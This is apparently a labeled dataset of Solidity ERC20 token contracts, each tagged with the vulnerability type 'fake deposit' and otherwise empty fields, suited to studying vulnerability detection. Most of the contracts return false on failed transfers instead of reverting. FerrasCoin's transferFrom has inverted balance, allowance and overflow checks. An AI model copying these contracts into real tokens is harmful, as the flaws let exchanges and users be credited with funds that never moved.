[
    {
        "Code": "pragma solidity ^0.5.0;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP. Does not include\r\n * the optional functions; to access them see {ERC20Detailed}.\r\n */\r\ninterface ERC20Interface {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract ERC20Base is ERC20Interface {\r\n    // Empty internal constructor, to prevent people from mistakenly deploying\r\n    // an instance of this contract, which should be used via inheritance.\r\n    // constructor () internal { }\r\n    // solhint-disable-previous-line no-empty-blocks\r\n\r\n    mapping (address => uint256) public _balances;\r\n    mapping (address => mapping (address => uint256)) public _allowances;\r\n    uint256 public _totalSupply;\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (_balances[msg.sender] >= _value && _value > 0) {\r\n            _balances[msg.sender] -= _value;\r\n            _balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { \r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\r\n            _balances[_to] += _value;\r\n            _balances[_from] -= _value;\r\n            _allowances[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return _balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        _allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return _allowances[_owner][_spender];\r\n    }\r\n    \r\n    function totalSupply() public view returns (uint256 total) {\r\n        return _totalSupply;\r\n    }\r\n}\r\n\r\ncontract Token is ERC20Base {\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    \r\n    constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n        _totalSupply = initialSupply;\r\n        _balances[msg.sender] = initialSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract Nameless is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function Nameless(\r\n        ) {\r\n        balances[msg.sender] = 99983740000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 107975610000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"Nameless\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals for display purposes\r\n        symbol = \"NXN\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "contract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n/*\r\nThis implements ONLY the standard functions and NOTHING else.\r\nFor a token like you would want to deploy in something like Mist, see HumanStandardToken.sol.\r\n\r\nIf you deploy this, you won't have anything useful.\r\n\r\nImplements ERC 20 Token standard: https://github.com/ethereum/EIPs/issues/20\r\n.*/\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n/*\r\nThis Token Contract implements the standard token functionality (https://github.com/ethereum/EIPs/issues/20) as well as the following OPTIONAL extras intended for use by humans.\r\n\r\nIn other words. This is intended for deployment in something like a Token Factory or Mist wallet, and then used by humans.\r\nImagine coins, currencies, shares, voting weight, etc.\r\nMachine-based, rapid creation of many tokens would not necessarily need these extra features or will be minted in other manners.\r\n\r\n1) Initial Finite Supply (upon creation one specifies how much is minted).\r\n2) In the absence of a token registry: Optional Decimal, Symbol & Name.\r\n3) Optional approveAndCall() functionality to notify a contract if an approval() has occurred.\r\n\r\n.*/\r\n\r\ncontract HumanStandardToken is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H0.1';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n    function HumanStandardToken(\r\n        uint256 _initialAmount,\r\n        string _tokenName,\r\n        uint8 _decimalUnits,\r\n        string _tokenSymbol\r\n        ) {\r\n        balances[msg.sender] = _initialAmount;               // Give the creator all initial tokens\r\n        totalSupply = _initialAmount;                        // Update total supply\r\n        name = _tokenName;                                   // Set the name for display purposes\r\n        decimals = _decimalUnits;                            // Amount of decimals for display purposes\r\n        symbol = _tokenSymbol;                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.4.22;\r\n\r\ncontract ForeignToken {\r\n    function balanceOf(address _owner) public constant returns (uint256);\r\n    function transfer(address _to, uint256 _value) public returns (bool);\r\n}\r\n\r\ncontract EIP20Interface {\r\n    function balanceOf(address _owner) public view returns (uint256 balance);\r\n    function transfer(address _to, uint256 _value) public returns (bool success);\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\r\n    function approve(address _spender, uint256 _value) public returns (bool success);\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\ncontract Owned {\r\n    address public owner;\r\n    address public newOwner;\r\n\r\n    event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address _newOwner) public onlyOwner {\r\n        newOwner = _newOwner;\r\n    }\r\n\r\n    function acceptOwnership() public {\r\n        require(msg.sender == newOwner);\r\n        emit OwnershipTransferred(owner, newOwner);\r\n        owner = newOwner;\r\n        newOwner = address(0);\r\n    }\r\n}\r\n\r\ncontract FerrasCoin is EIP20Interface, Owned{\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalContribution = 0; // Total que han gastado en ETH\r\n    string public symbol; // Symbolo del Token\r\n    string public name; // Nombre del token\r\n    uint8 public decimals; // # de decimales\r\n    uint256 public _totalSupply = 1300000000; // Suministro m\u00e1ximo\r\n    uint256 public tokensIssued; // Tokens expedidos\r\n\r\n    modifier onlyExecuteBy(address _account)\r\n    {\r\n        require(msg.sender == _account);\r\n        _;\r\n    }\r\n\r\n\r\n    function balanceOf(address _owner) public constant returns (uint256) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        if (_value == 0) { return false; }\r\n        uint256 fromBalance = balances[msg.sender];\r\n        bool sufficientFunds = fromBalance >= _value;\r\n        bool overflowed = balances[_to] + _value < balances[_to];\r\n        if (sufficientFunds && !overflowed) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        if (_value == 0) { return false; }\r\n        uint256 fromBalance = balances[_from];\r\n        uint256 allowance = allowed[_from][msg.sender];\r\n        bool sufficientFunds = fromBalance <= _value;\r\n        bool sufficientAllowance = allowance <= _value;\r\n        bool overflowed = balances[_to] + _value > balances[_to];\r\n        if (sufficientFunds && sufficientAllowance && !overflowed) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public constant returns (uint256) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    function withdrawForeignTokens(address _tokenContract) public onlyExecuteBy(owner) returns (bool) {\r\n        ForeignToken token = ForeignToken(_tokenContract);\r\n        uint256 amount = token.balanceOf(address(this));\r\n        return token.transfer(owner, amount);\r\n    }\r\n\r\n    function withdraw() public onlyExecuteBy(owner) {\r\n        owner.transfer(address(this).balance);\r\n    }\r\n\r\n    function getStats() public constant returns (uint256, uint256, uint256) {\r\n        return (totalContribution, _totalSupply, tokensIssued);\r\n    }\r\n\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n        symbol = \"ZAZAZA\";\r\n        name = \"Ferras Coin\";\r\n        decimals = 0;\r\n        uint256 paMi = 9999999;\r\n        tokensIssued += paMi;\r\n        balances[msg.sender] += paMi;\r\n        emit Transfer(address(this), msg.sender, paMi);\r\n    }\r\n\r\n    function() payable public {\r\n        uint rate = uint(msg.value / 100000000000000);\r\n        if((tokensIssued + rate) <= _totalSupply){\r\n            owner.transfer(msg.value);\r\n            totalContribution += msg.value;\r\n            tokensIssued += rate;\r\n            balances[msg.sender] += rate;\r\n            emit Transfer(address(this), msg.sender, rate);\r\n        }else{\r\n            revert();\r\n        }\r\n        \r\n    }\r\n\r\n\r\n    \r\n    event LaDerrama(address indexed _burner, uint256 _value);\r\n\r\n    function FerrasYaEstuvo(uint256 _value) public {\r\n        require(_value > 0);\r\n        require(_value <= balances[msg.sender]);\r\n        address burner = msg.sender;\r\n        balances[burner] -= _value;\r\n        _totalSupply -= _value;\r\n        emit LaDerrama(burner, _value);\r\n    }\r\n\r\n\r\n\r\n\r\n\r\n    function getTime() internal constant returns (uint) {\r\n        return now;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;                   //Name of the token\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n    string public symbol;                 //An identifier: eg AXM\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 10000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 10000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"Molchem\";                                   // Set the name for display purposes\r\n        decimals = 8;                            // Amount of decimals\r\n        symbol = \"CHEM\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\ncontract Token {\r\n /// @return total amount of tokens\r\n function totalSupply() constant returns (uint256 supply) {}\r\n/// @param _owner The address from which the balance will be retrieved\r\n /// @return The balance\r\n function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n/// @notice send `_value` token to `_to` from `msg.sender`\r\n /// @param _to The address of the recipient\r\n /// @param _value The amount of token to be transferred\r\n /// @return Whether the transfer was successful or not\r\n function transfer(address _to, uint256 _value) returns (bool success) {}\r\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n /// @param _from The address of the sender\r\n /// @param _to The address of the recipient\r\n /// @param _value The amount of token to be transferred\r\n /// @return Whether the transfer was successful or not\r\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n /// @param _spender The address of the account able to transfer the tokens\r\n /// @param _value The amount of wei to be approved for transfer\r\n /// @return Whether the approval was successful or not\r\n function approve(address _spender, uint256 _value) returns (bool success) {}\r\n/// @param _owner The address of the account owning tokens\r\n /// @param _spender The address of the account able to transfer the tokens\r\n /// @return Amount of remaining tokens allowed to spent\r\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\ncontract StandardToken is Token {\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {\r\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\r\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\r\n //Replace the if with this one instead.\r\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n if (balances[msg.sender] >= _value && _value > 0) {\r\n balances[msg.sender] -= _value;\r\n balances[_to] += _value;\r\n Transfer(msg.sender, _to, _value);\r\n return 